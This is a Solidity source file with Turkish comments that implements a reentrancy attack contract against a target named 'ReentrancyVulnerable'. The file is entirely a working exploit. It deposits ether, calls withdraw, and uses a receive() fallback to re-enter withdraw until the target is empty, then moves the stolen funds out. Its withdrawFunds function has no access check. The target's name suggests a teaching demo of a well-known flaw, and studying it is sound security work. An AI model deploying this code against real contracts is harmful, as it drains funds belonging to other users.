// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Savunmasız kontratı hedef alan saldırı kontratı
contract ReentrancyAttack {
    ReentrancyVulnerable public vulnerableContract;
    uint256 public attackAmount;

    // Savunmasız kontratın adresini constructor ile al
    constructor(address _vulnerableContractAddress) {
        vulnerableContract = ReentrancyVulnerable(_vulnerableContractAddress);
        attackAmount = 1 ether; // Saldırıda çekilecek miktar (örnek olarak 1 Ether)
    }

    // Saldırganın Ether almasını sağlayan fallback fonksiyonu
    receive() external payable {
        // Eğer savunmasız kontratta hala Ether varsa, tekrar withdraw'u çağır
        if (address(vulnerableContract).balance >= attackAmount) {
            vulnerableContract.withdraw(attackAmount);
        }
    }

    // Saldırıyı başlatan fonksiyon
    function attack() public payable {
        // Önce savunmasız kontrata Ether yatır
        require(msg.value >= attackAmount, "En az 1 Ether gonder");
        vulnerableContract.deposit{value: attackAmount}();

        // Withdraw fonksiyonunu çağırarak saldırıyı başlat
        vulnerableContract.withdraw(attackAmount);
    }

    // Saldırganın kontratındaki Ether bakiyesini kontrol etmek için
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    // Saldırganın Ether'lerini çekmesi için yardımcı fonksiyon
    function withdrawFunds() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
